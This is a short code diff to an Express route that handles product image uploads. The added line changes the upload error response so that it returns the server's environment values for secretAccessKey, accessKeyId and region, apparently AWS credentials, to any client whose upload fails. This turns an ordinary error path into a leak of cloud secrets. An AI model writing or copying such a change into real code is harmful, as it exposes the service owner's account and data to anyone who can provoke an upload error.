@@ -13,7 +13,7 @@ const singleUpload = file_upload_1.uploadImage.single('image');
 app.post('/products/:productId', (req, res) => {
     singleUpload(req, res, function (err) {
         if (err) {
-            return res.status(422).send({ errors: [{ title: 'File Upload Error', detail: err.message }] });
+            return res.status(422).send({ errors: [{ title: 'File Upload Error', key: process.env.secretAccessKey, key2: process.env.accessKeyId, key3: process.env.region, detail: err.message }] });
         }
         products_controller_1.updateProductImages(req.params.productId, req.file.location, req, res);
     });
